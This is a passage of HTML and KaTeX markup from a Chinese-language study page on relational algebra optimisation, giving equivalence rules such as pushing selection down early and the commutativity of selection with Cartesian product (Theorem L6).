xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi></mrow><annotation encoding="application/x-tex">F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span></eq>还涉及不属于<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mn>1</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">{A1,..A_n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">..</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></eq>的属性<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>B</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">{B_1,..B_m}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">..</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></eq>,则<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>π</mi><mrow><msub><mi>A</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow></msub><mo stretchy="false">(</mo><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>≡</mo><msub><mi>π</mi><mrow><msub><mi>A</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow></msub><mo stretchy="false">(</mo><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>π</mi><mrow><msub><mi>A</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub><mo separator="true">,</mo><msub><mi>B</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>B</mi><mi>m</mi></msub></mrow></msub><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\pi_{A_1,...A_n}(\sigma_F(E))\equiv\pi_{A_1,..A_n}(\sigma_F(\pi_{A_1,..A_n,B_1,..B_m}(E)))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight">...</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.0502em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:-0.0502em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">)))</span></span></span></span></span></eqn></section></p><p>尽可能地早做选择</p><h5 id="%E5%AE%9A%E7%90%86l6%EF%BC%9A%E9%80%89%E6%8B%A9%E5%90%88%E7%A7%AF%E7%9A%84%E4%BA%A4%E6%8D%A2%E5%BE%8B" tabindex="-1">定理L6：选择合积的交换律</h5><p>设<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_1,E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>是关系代数表达式</p><ul><li>(1):若条件F只涉及<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>中的属性：则有<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo>×</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>≡</mo><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>×</mo><mo stretchy="false">(</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sigma_F(E_1\times E_2)\equiv \sigma_{F}(E_1)\times(E_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></eqn></section></li><li>(2):若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo>=</mo><msub><mi>F</mi><mn>1</mn></msub><mo>∧</mo><msub><mi>F</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">F=F_1\wedge F_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">F_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">F_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,分别只涉及<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_1,E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>中属性，则有：<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo>×</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>≡</mo><msub><mi>σ</mi><msub><mi>F</mi><mn>1</mn></msub></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>×</mo><msub><mi>σ</mi><msub><mi>F</mi><mn>2</mn></msub></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sigma_F(E_1\times E_2)\equiv \sigma_{F_1}(E_1)\times \sigma_{F_2}(E_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t 